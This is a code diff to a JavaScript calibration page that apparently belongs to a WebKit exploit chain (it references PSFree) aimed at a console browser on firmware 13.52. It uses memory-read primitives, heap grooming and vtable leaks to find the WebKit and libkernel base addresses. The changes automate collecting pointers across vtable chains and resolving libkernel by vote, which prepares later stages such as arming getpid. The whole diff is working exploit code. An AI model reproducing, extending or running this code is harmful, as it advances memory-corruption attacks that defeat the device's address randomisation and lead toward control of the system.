@@ -6,6 +6,10 @@ import {
     collectLiveVtableExtPtrs,
     resolveLibkernelFromExtList,
     saveLibkernelSession,
+    loadSessionOffsets,
+    sessionBasesFromStorage,
+    persistSessionBases,
+    same64Ptr,
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
@@ -28,7 +32,9 @@ let walkQuiet = false;
 const calRetain = [];
 
 const LOG_MAX = 300;
-const BUILD_ID = "cal-20250830b";
+const BUILD_ID = "cal-20250830d";
+const WEBKIT_CODE_PROLOGUE = 0xe5894855;
+const VTABLE_EXT_SLOTS = 48;
 const crashLog = createCrashLog({
     ssLog: "wk-cal-log",
     ssState: "wk-cal-state",
@@ -377,6 +383,35 @@ function activeBase() {
     const delta = activeDelta();
     if (!nativeFn || !(delta > 0)) return null;
     return baseFromDelta(nativeFn, delta);
+}
+
+/** Offset table merged like index_rw loadEffectiveOff (calibrated + expm1 field). */
+function loadEffectiveOffCal() {
+    let off = Object.assign({}, tableOff || {});
+    off = merge1352Table(off);
+    off = loadSessionOffsets(off);
+    const delta = activeDelta();
+    if (delta > 0) off.wk_expm1_builtin = delta;
+    return off;
+}
+
+/** Persist + derive webkitBase = nativeFn − expm1 (same path as index_rw). */
+function syncBasesLikeRw() {
+    if (nativeFn) persistSessionBases(nativeFn, null);
+    const off = loadEffectiveOffCal();
+    const bases = sessionBasesFromStorage(off, { nativeFn: nativeFn });
+    let webkitBase = bases.webkitBase;
+    if (bases.derived) {
+        if (webkitBase && !same64Ptr(webkitBase, bases.derived))
+            mark("BASE-SYNC", "webkitBase stale cached — using nativeFn-expm1 (index_rw)");
+        webkitBase = bases.derived;
+    }
+    if (nativeFn && webkitBase) persistSessionBases(nativeFn, webkitBase);
+    const expm1 = off.wk_expm1_builtin || 0;
+    mark("BASE-SYNC", "webkit=" + (webkitBase || "—") + " expm1=0x" + expm1.toString(16));
+    if (webkitBase && baseIn) baseIn.value = ptrNum(webkitBase).toString(16);
+    updateResultPanel();
+    return { off, webkitBase, nativeFn: nativeFn || bases.nativeFn };
 }
 
 function impliedExpm1FromBase(fn, base) {
@@ -767,15 +802,55 @@ function discoverTextareaVtableLite(p, carrier) {
     return hits;
 }
 
+function isWebkitExtCode(code) {
+    return code != null && (code >>> 0) === WEBKIT_CODE_PROLOGUE;
+}
+
+function ptrLooksWebkitInterior(fnPtr, webkitBase) {
+    if (!fnPtr || !webkitBase || fnPtr.hi !== webkitBase.hi) return false;
+    const lo = webkitBase.low >>> 0;
+    const fl = fnPtr.low >>> 0;
+    if (fl < lo) return false;
+    return (fl - lo) < 0x1500000;
+}
+
+/** All vtable chains → external fn ptrs (48 slots each, skips webkit interior). */
+function collectExtPtrsFromVtableHits(p, hits, webkitBase) {
+    const out = [];
+    const seen = new Set();
+    for (let hi = 0; hi < hits.length; hi++) {
+        const hit = hits[hi];
+        if (!hit || !hit.vtable) continue;
+        for (let i = 0; i < VTABLE_EXT_SLOTS; i++) {
+            const ei = read8p(p, hit.vtable.add32(i * 8));
+            if (!ei || ei.hi < 0x8) continue;
+            if (webkitBase && ptrLooksWebkitInterior(ei, webkitBase)) continue;
+            const code = read4p(p, ei);
+            if (code == null || isBadRead(code) || isWebkitExtCode(code)) continue;
+            const hex = ptrNum(ei).toString(16);
+            if (seen.has(hex)) continue;
+            seen.add(hex);
+            out.push({
+                label: hit.label + "[" + i + "]",
+                ptr: hex,
+                hex: hex,
+                code: fmtMagic(code),
+            });
+        }
+    }
+    return out;
+}
+
 function logVtableExtPtrs(p, hit) {
     if (!hit || !hit.vtable) return 0;
     const saved = [];
     let n = 0;
-    for (let i = 0; i < 12; i++) {
+    for (let i = 0; i < VTABLE_EXT_SLOTS; i++) {
         const ei = read8p(p, hit.vtable.add32(i * 8));
         if (!ei || ei.hi < 0x8) continue;
         const code = read4p(p, ei);
         if (isBadRead(code)) continue;
+        if (isWebkitExtCode(code >>> 0)) continue;
         const ptrHex = ptrNum(ei).toString(16);
         mark("EXT-PTR", "vtable[" + i + "]=" + ei + " code=" + fmtMagic(code));
         saved.push({ label: "vtable[" + i + "]", ptr: ptrHex, code: fmtMagic(code) });
@@ -1649,6 +1724,8 @@ async function runStart() {
         if (!nativeFn) nativeFn = loadNativeFnOverride();
         if (!nativeFn) throw new Error("nativeFn capture failed");
 
+        syncBasesLikeRw();
+
         scanIndex = 0;
         scanList = [];
         try {
@@ -1672,7 +1749,7 @@ async function runStart() {
             return;
         }
 
-        mark("HINT-CAL", "tap 2e Find base (vtable) when ready — not auto (OOM-safe)");
+        mark("HINT-CAL", "tap 2e once — vtable leak + ext→lk auto (same base as index_rw)");
         prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
@@ -1685,7 +1762,7 @@ async function runStart() {
             await walkVtableForBase();
             await freeCalMemory();
         } else {
-            mark("NEXT", "tap 2e Find base (vtable) OR set base+expm1 then 4b Accept");
+            mark("NEXT", "tap 2e once (vtable + ext→lk) OR set base+expm1 then 4b Accept");
             if (manualBase || params.get("base"))
                 await freeCalMemory();
             state("primitive OK — 2e vtable or set base", "ok");
@@ -1845,7 +1922,7 @@ function runAssumeTest(fromStart) {
     setUi();
 }
 
-async function walkOneAnchorChunk(p, anchor, label, startStep, chunkSteps, backward) {
+async function walkOneAnchorChunk(p, anchor, label, startStep, chunkSteps, backward, silentCont) {
     const maxSteps = backward ? FIND_BASE_MAX_STEPS : FIND_FWD_MAX_STEPS;
     let bad = 0;
     let mapped = 0;
@@ -1878,9 +1955,73 @@ async function walkOneAnchorChunk(p, anchor, label, startStep, chunkSteps, backw
             + " last=" + fmtMagic(lastMagic));
         return { hit: null, nextStep: endStep, done: true };
     }
-    mark("WALK-CONT", label + " " + tag + " " + endStep + "/" + maxSteps
-        + " — tap 2e again");
+    if (!silentCont)
+        mark("WALK-CONT", label + " " + tag + " " + endStep + "/" + maxSteps
+            + " — tap 2e again");
     return { hit: null, nextStep: endStep, done: false };
+}
+
+async function runExtLkAutoScan(p, hits, best, webkitBase, off) {
+    const chainExt = collectExtPtrsFromVtableHits(p, hits, webkitBase);
+    mark("LK-EXT-SCAN", "chain ext ptrs=" + chainExt.length + " (all cells/impl/bfly)");
+    const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
+        carrier: carrierRef,
+        retain: calRetain,
+        vtableEntries: VTABLE_EXT_SLOTS,
+        cellMax: 4,
+    });
+    let sessionEntries = [];
+    try {
+        const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
+        if (raw) sessionEntries = JSON.parse(raw);
+    } catch (_) { }
+    const merged = [];
+    const seen = new Set();
+    function addEntry(e) {
+        const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
+        if (!hex || seen.has(hex)) return;
+        seen.add(hex);
+        merged.push({ label: e.label || "ext", hex: hex, ptr: hex, code: e.code || null });
+    }
+    for (let i = 0; i < chainExt.length; i++) addEntry(chainExt[i]);
+    for (let i = 0; i < live.entries.length; i++) addEntry(live.entries[i]);
+    for (let j = 0; j < sessionEntries.length; j++) addEntry(sessionEntries[j]);
+
+    mark("LK-EXT-SCAN", "merged n=" + merged.length + " — 0-read vote…");
+    for (let ci = 0; ci < merged.length && ci < 10; ci++) {
+        mark("LK-EXT-CAND", merged[ci].label + " " + merged[ci].hex
+            + (merged[ci].code ? " " + merged[ci].code : ""));
+    }
+
+    if (!merged.length) return { ok: false, error: "no ext ptrs" };
+
+    const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
+        minVotes: 2,
+        minDistinctFn: 2,
+    });
+    if (hit.ok && hit.lk) {
+        saveLibkernelSession(hit.lk, hit.iatRva || null);
+        const expm1 = off.wk_expm1_builtin || 0;
+        if (expm1 > 0)
+            applyCalibration(expm1, webkitBase, hit.lk, 0, { accept: true });
+        mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ") reads=0");
+        mark("HINT", "index_rw → Accept lk → reload → Arm getpid");
+        state("libkernel auto OK (0-read)", "ok");
+        return { ok: true, lk: hit.lk };
+    }
+    mark("LK-EXT-MISS", hit.error || "no lk consensus");
+    if (hit.hint)
+        mark("LK-HINT", hit.hint);
+    if (hit.zeroRank && hit.zeroRank.length) {
+        for (let ri = 0; ri < hit.zeroRank.length && ri < 4; ri++) {
+            const r = hit.zeroRank[ri];
+            mark("LK-ZERO-RANK", (ri + 1) + " " + String(r.lk)
+                + " fn=" + (r.distinctFn != null ? r.distinctFn : "?")
+                + " dual=" + (r.dualRva != null ? r.dualRva : 0)
+                + " votes=" + r.count);
+        }
+    }
+    return { ok: false, hit: hit };
 }
 
 async function walkVtableForBase() {
@@ -1891,108 +2032,40 @@ async function walkVtableForBase() {
     }
 
     walkQuiet = true;
-    const hits = discoverTextareaVtableLite(p, carrierRef);
+    const hits = discoverTextareaVtableChains(p, carrierRef);
     walkQuiet = false;
 
     if (!hits.length) {
-        mark("VTABLE-FAIL", "PSFree textarea chain failed — re-run Start");
+        mark("VTABLE-FAIL", "no vtable chain — re-run Start (try ?g=512 groom)");
         state("vtable leak failed", "bad");
         return false;
     }
 
+    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
     const best = hits[0];
     vtableHit = best;
     vtablePtr = best.vtable;
     try { sessionStorage.setItem(SS_VTABLE_PTR, String(best.vtable)); } catch (_) { }
 
-    mark("VTABLE-OK", best.label + " vtable=" + best.vtable);
+    mark("VTABLE-OK", best.label + " vtable=" + best.vtable + " chains=" + hits.length);
     const extN = logVtableExtPtrs(p, best);
-    mark("LK-EXT-SCAN", extN + " EXT-PTR — auto-resolving libkernel…");
+    mark("LK-EXT-SCAN", extN + " EXT-PTR from best — scanning " + hits.length + " chains…");
 
-    const off = tableOff || offsetsFor(navigator.userAgent).off;
-    let webkitBase = manualBase;
-    if (!webkitBase && nativeFn && off && off.wk_expm1_builtin)
-        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-    if (webkitBase && off) {
-        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
-            carrier: carrierRef,
-            retain: calRetain,
-            vtableEntries: 48,
-            cellMax: 2,
-        });
-        let sessionEntries = [];
-        try {
-            const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
-            if (raw) sessionEntries = JSON.parse(raw);
-        } catch (_) { }
-        const merged = [];
-        const seen = new Set();
-        function addEntry(e) {
-            const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
-            if (!hex || seen.has(hex)) return;
-            seen.add(hex);
-            merged.push({ label: e.label || "ext", hex: hex, ptr: hex, code: e.code || null });
-        }
-        for (let i = 0; i < live.entries.length; i++) addEntry(live.entries[i]);
-        for (let j = 0; j < sessionEntries.length; j++) addEntry(sessionEntries[j]);
-
-        if (merged.length) {
-            const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
-                minVotes: 2,
-                minDistinctFn: 2,
-            });
-            if (hit.ok && hit.lk) {
-                saveLibkernelSession(hit.lk, hit.iatRva || null);
-                mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ") reads=0");
-                mark("HINT", "index_rw → Accept lk → reload → Arm getpid");
-                state("libkernel auto OK (0-read)", "ok");
-                return true;
-            }
-            mark("LK-EXT-MISS", hit.error || "no lk consensus");
-            if (hit.hint)
-                mark("LK-HINT", hit.hint);
-            if (hit.zeroRank && hit.zeroRank.length) {
-                for (let ri = 0; ri < hit.zeroRank.length && ri < 3; ri++) {
-                    const r = hit.zeroRank[ri];
-                    mark("LK-ZERO-RANK", (ri + 1) + " " + String(r.lk) + " votes=" + r.count);
-                }
-            }
-        }
-    }
-    mark("HINT", "ext auto miss — index_rw → Scan ext→lk after Start");
-
-    let walkSt = null;
-    try {
-        const raw = sessionStorage.getItem(SS_VTABLE_WALK);
-        if (raw) walkSt = JSON.parse(raw);
-    } catch (_) { }
-
-    if (!walkSt || walkSt.vt !== ptrNum(best.vtable)) {
-        walkSt = { vt: ptrNum(best.vtable), step: 0, label: best.label };
-    }
-
-    state("walking vtable anchor " + walkSt.step + "…", "warn");
-    walkQuiet = true;
-    const chunk = await walkOneAnchorChunk(p, best.vtable, walkSt.label, walkSt.step, VTABLE_WALK_CHUNK, true);
-    walkQuiet = false;
-    walkSt.step = chunk.nextStep;
-
-    if (chunk.hit) {
-        try { sessionStorage.removeItem(SS_VTABLE_WALK); } catch (_) { }
-        applyBaseFound(chunk.hit, "walk/" + walkSt.label);
-        state("base found via vtable", "ok");
-        return true;
-    }
-
-    if (chunk.done) {
-        try { sessionStorage.removeItem(SS_VTABLE_WALK); } catch (_) { }
-        mark("CAL-FAIL", "vtable walk exhausted — use EXT-PTR on index_rw instead");
-        state("walk done — use EXT-PTR on rw", "warn");
+    const synced = syncBasesLikeRw();
+    const off = synced.off;
+    const webkitBase = synced.webkitBase;
+    if (!webkitBase || !off) {
+        mark("CAL-FAIL", "no webkit base — set expm1 or run Start first");
+        state("no webkit base", "bad");
         return false;
     }
 
-    try { sessionStorage.setItem(SS_VTABLE_WALK, JSON.stringify(walkSt)); } catch (_) { }
-    state("walk " + walkSt.step + "/" + FIND_BASE_MAX_STEPS + " — tap 2e again", "warn");
+    const lkHit = await runExtLkAutoScan(p, hits, best, webkitBase, off);
+    if (lkHit.ok) return true;
+
+    mark("CAL-FAIL", "ext→lk miss — base=" + webkitBase + " (nativeFn-expm1, same as index_rw)");
+    mark("HINT", "index_rw → Scan ext→lk, or groom + retry 2e");
+    state("lk miss — base synced to index_rw", "warn");
     return false;
 }
 
@@ -2332,7 +2405,7 @@ function init() {
     mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
     mark("BOOT", "index_cal.html — expm1 / vtable for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "2e vtable: manual button or ?vtable=1 (not auto — OOM)");
+    mark("BOOT", "2e = one tap: vtable leak + ext→lk auto (?vtable=1 runs after Start)");
     wireGroomBar();
     setUi();
     renderOut();
